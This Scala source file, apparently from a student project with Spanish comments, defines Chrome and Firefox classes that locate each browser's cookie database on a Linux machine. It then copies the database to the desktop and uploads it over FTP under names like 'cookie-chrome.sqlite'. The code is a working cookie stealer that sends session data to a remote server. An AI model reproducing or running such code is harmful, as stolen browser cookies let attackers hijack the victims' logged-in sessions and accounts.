package si

import scala.sys.process._
import java.io.File
import si.TP.home
import si.TP.escritorio
import scala.util.Try

// como una interface de java pero con metodos ya implementados
sealed trait Navegador {
  val so: String
  val cookieDir: String
  lazy val enviarCookieAlEscritorio: Int = Seq("bash", "-c", s"cp $cookieDir $escritorio").!
  lazy val enviarCookiePorFTP: Try[Unit] = {
    Try {
      ftpUploader.uploadFile(cookieDir, "cookie-" + this + ".sqlite", "")
      ftpUploader.disconnect
    }
  }
}


final case class Chrome(so: String) extends Navegador {
  val cookieDir = home + "/.config/google-chrome/Default/Cookies"

  override def toString: String = "chrome"
}

final case class Firefox(so: String) extends Navegador {
  private val firiDir = getListOfSubDirectories(new File(home + "/.mozilla/firefox"))
  private val profileDir = firiDir.filter { str => str.reverse.take(8) == ".default".reverse }.head.trim
  val cookieDir = home + "/.mozilla/firefox/" + profileDir + "/cookies.sqlite"

  override def toString: String = "firefox"
}